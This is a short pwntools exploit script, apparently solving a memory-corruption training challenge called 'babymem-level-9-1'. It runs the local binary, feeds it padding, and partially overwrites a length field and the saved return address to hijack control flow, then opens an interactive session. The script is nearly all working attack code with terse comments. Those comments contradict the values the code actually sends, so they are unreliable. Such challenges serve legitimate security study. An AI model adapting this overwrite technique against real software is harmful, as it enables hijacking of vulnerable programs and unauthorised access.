from pwn import *

# First, payload_size = 138
# Wait till reading into 116 (that's where 'n' is), enter "\x86"
# It will then start reading at 136 (that's where 'ret_addr" is), enter '\xa2\x09'
# Re-run it until it hits

p = process("./babymem-level-9-1")

res = p.recv(20900)
print(res)

p.sendline(b"106")

res = p.recv(20900)
print(res)

for i in range(70):
    p.sendline(b"")
p.sendline(b"")
p.sendline(b"")

p.send(b"\x67")
p.send(b"\x84\x03")
p.send(b"\n")

p.interactive()
